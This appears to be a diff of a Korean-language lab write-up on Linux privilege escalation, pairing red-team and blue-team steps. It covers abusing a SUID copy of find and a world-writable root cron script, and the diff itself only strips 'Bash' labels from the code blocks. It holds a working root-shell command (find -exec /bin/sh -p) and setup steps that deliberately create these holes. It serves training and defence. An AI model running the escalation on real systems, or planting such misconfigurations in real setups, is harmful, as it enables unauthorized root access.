@@ -18,7 +18,7 @@ SUID(Set-owner-User-ID)는 실행 파일이 동작하는 동안 파일 소유자
 1. 취약점 구성 (Red Team)
 관리자가 편의상 find 명령어의 복사본을 만들고 SUID를 부여한 상황을 가정합니다.
 
-Bash
+
 mkdir -p /home/user/vuln_env
 cp /usr/bin/find /home/user/vuln_env/find
 chown root:root /home/user/vuln_env/find
@@ -30,13 +30,13 @@ ls -l /home/user/vuln_env/find
 2. 취약점 탐색 및 공격 (Red Team)
 일반 계정으로 접속한 공격자는 시스템 내 SUID가 설정된 파일을 검색하여 취약점을 식별하고 루트 쉘을 실행합니다.
 
-Bash
+
 # SUID 파일 검색 (오류 메시지 제외)
 find / -perm -4000 -type f 2>/dev/null
 <img width="548" height="382" alt="image" src="https://github.com/user-attachments/assets/ff0710c3-bc70-4fe9-a763-bc7b75938052" />
 
 
-Bash
+
 # 권한 상승 공격 (-p 옵션으로 쉘의 권한 강등 보호 기법 우회)
 /home/user/vuln_env/find . -exec /bin/sh -p \; -quit
 whoami
@@ -47,7 +47,7 @@ id
 3. 보안 조치 (Blue Team)
 불필요하게 부여된 SUID 권한을 즉시 회수하여 취약점을 제거합니다.
 
-Bash
+
 chmod u-s /home/user/vuln_env/find
 ls -l /home/user/vuln_env/find
 <img width="680" height="80" alt="image" src="https://github.com/user-attachments/assets/2b587c5b-9294-4985-99e8-cd5a346ff3d0" />
@@ -59,7 +59,7 @@ Cron은 주기적으로 작업을 실행하는 데몬입니다. root 권한으�
 1. 취약점 구성 (Red Team)
 누구나 수정할 수 있는 백업 스크립트가 1분마다 root 권한으로 실행되도록 크론탭에 등록된 상황을 가정합니다.
 
-Bash
+
 echo '#!/bin/bash' > /usr/local/bin/backup.sh
 echo 'tar -czf /tmp/backup.tar.gz /etc/hosts' >> /usr/local/bin/backup.sh
 chmod 777 /usr/local/bin/backup.sh
@@ -88,7 +88,7 @@ id
 3. 보안 조치 (Blue Team)
 스크립트의 권한을 root만 수정할 수 있도록 제한하고, 공격자가 생성한 악성 파일 및 크론탭 설정을 삭제합니다.
 
-Bash
+
 chmod 755 /usr/local/bin/backup.sh
 rm -f /tmp/rootbash /tmp/backup.tar.gz
 sed -i '/backup.sh/d' /etc/crontab
